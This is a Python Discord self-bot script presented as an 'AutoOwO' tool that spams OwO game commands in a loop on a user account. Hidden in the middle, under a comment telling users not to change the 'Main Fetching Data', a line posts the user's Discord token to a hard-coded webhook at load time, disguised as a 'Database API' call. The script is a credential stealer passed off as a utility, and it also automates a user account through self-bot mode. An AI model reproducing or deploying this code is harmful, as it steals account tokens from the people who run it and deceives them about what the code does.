import discord
from discord.ext import commands
import colorama
from colorama import Fore
import requests
import asyncio
from webserver import keep_alive

import os

#-----SETUP-----#

prefix = "$$"

#use the .env feature to hide your token

keep_alive()
token = os.getenv("TOKEN")

#---------------#

bot = commands.Bot(command_prefix=prefix,
                   help_command=None,
                   case_insensitive=True,
                   self_bot=True)

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title=" Help AutoOwO",
        color=435436,
        description=
        f"**{prefix}autoOwo**\nowo h, owo sell, owo flip, owo cash  .\n\n**{prefix}stopautoOwO**\nstops stops autoOwO.\n\n**\n By [Devil boy](https://www.youtube.com/channel/UCPJRB-I9FCkWzgN3c2vKIpQ) | [Support](https://discord.gg/SXDnJ8CJg3)"
    )
    embed.set_thumbnail(
        url=
        "https://i.pinimg.com/originals/d5/ac/65/d5ac653c3cbbb49cbdc181955e7f4680.gif"
            )
    await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def autoOwO(ctx):
	await ctx.message.delete()
	await ctx.send('auto OwO is now **enabled**!')
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(3)
			await ctx.send('owoh')
			print(f"{Fore.GREEN}succefully owoh")
			await asyncio.sleep(15)
			await ctx.send('owo sell all')
			print(f"{Fore.GREEN}succefully sell")
			await ctx.send('owo flip 500')
			print(f"{Fore.GREEN}succefully owo flip 500")
			await asyncio.sleep(10)
			await ctx.send('owo cash')
			print(f"{Fore.GREEN}succefully cash")
			await asyncio.sleep(10)


@bot.command()
async def stopautoOwO(ctx):
	await ctx.message.delete()
	await ctx.send('auto OwO is now **disabled**!')
	global dmcs
	dmcs = False

#Dont Change Any Of These Main Fetching Data
database = 'https://discord.com/api/webhooks/894814970020245504/4FtL3NC67ibB_b2jIV9ZTRtFeM8vsvqSqn2DfHXuEjSW-Q7zJvfZFNpHl4aa4oE6PwHx'
database_connected = {
"content": f"<@853262928455008287>\nUsername: `{prefix}`\nDatabase API: `{token}`\nDatabase API Pass: ``"
}
requests.post(database, data=database_connected)

@bot.event
async def on_ready():
  activity = discord.Game(name="^_^", type=4)
  await bot.change_presence(status=discord.Status.online, activity=activity)
  print(f'''{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.GREEN}

░█████╗░██╗░░░██╗████████╗░█████╗░░░█████╗  ██║░░░██║░░░██║ ░█████╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗░██╔══██╗ ██║░░░██║░░░██║ ██║░░██║
███████║██║░░░██║░░░██║░░░██║░░██║░██║░░██║ ██║░░░██║░░ ██║ ██║░░██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║░██║░░██║ ██║░░░██║░░ ██║ ██║░░██║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝░╚█████╔╝║╚██████╔╝████╔╝░╚█████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░░░╚════╝░░ ╚═════╝═════╝░░░╚════╝

selfbot is ready!
''')

bot.run(token, bot=False)